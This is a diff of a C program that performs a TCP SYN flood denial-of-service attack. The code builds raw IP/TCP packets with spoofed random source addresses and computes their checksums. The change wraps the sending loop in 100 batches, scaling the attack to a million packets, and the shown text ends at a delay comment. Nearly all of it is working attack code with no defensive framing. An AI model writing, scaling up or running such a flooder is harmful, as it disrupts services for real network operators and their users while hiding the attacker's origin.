@@ -119,44 +119,46 @@ int main(int argc, char *argv[]) {
 
     printf("Starting SYN flood...\n");
     int total_packets = 10000;
-
-    for (int i = 0; i < total_packets; i++) {
-        char src_ip[16];
-        random_ip(src_ip);
-        iph->saddr = inet_addr(src_ip);
-        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
-
-        tcph->source = htons(rand() % 65535);
-        tcph->seq = rand();
-        tcph->check = 0;
-
-        // Create pseudo header
-        struct pseudo_header psh;
-        psh.source_address = inet_addr(src_ip);
-        psh.dest_address = sin.sin_addr.s_addr;
-        psh.placeholder = 0;
-        psh.protocol = IPPROTO_TCP;
-        psh.tcp_length = htons(sizeof(struct tcphdr));
-
-        char pseudogram[4096];
-        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
-        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-
-        tcph->check = csum((unsigned short*) pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
-
-        // Send packet
-        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-            perror("sendto failed");
-        } else {
-            // Calculate elapsed time
-            struct timeval current_time;
-            gettimeofday(&current_time, NULL);
-            double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
-                             (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
-            
-            // Log sent packet details
-            fprintf(log_file, "SEQ = %d TTL[%f]\n", i + 1, elapsed);
-            printf("Packet %d sent from %s\n", i + 1, src_ip);
+    int batches = 100;
+    for (int j = 0; j < batches; j++) {
+        for (int i = 0; i < total_packets; i++) {
+            char src_ip[16];
+            random_ip(src_ip);
+            iph->saddr = inet_addr(src_ip);
+            iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
+    
+            tcph->source = htons(rand() % 65535);
+            tcph->seq = rand();
+            tcph->check = 0;
+    
+            // Create pseudo header
+            struct pseudo_header psh;
+            psh.source_address = inet_addr(src_ip);
+            psh.dest_address = sin.sin_addr.s_addr;
+            psh.placeholder = 0;
+            psh.protocol = IPPROTO_TCP;
+            psh.tcp_length = htons(sizeof(struct tcphdr));
+    
+            char pseudogram[4096];
+            memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
+            memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
+    
+            tcph->check = csum((unsigned short*) pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
+    
+            // Send packet
+            if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
+                perror("sendto failed");
+            } else {
+                // Calculate elapsed time
+                struct timeval current_time;
+                gettimeofday(&current_time, NULL);
+                double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
+                                 (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
+                
+                // Log sent packet details
+                fprintf(log_file, "SEQ = %d TTL[%f]\n", i + 1, elapsed);
+                printf("Packet %d sent from %s\n", i + 1, src_ip);
+            }
         }
 
         // Optional delay (if needed)
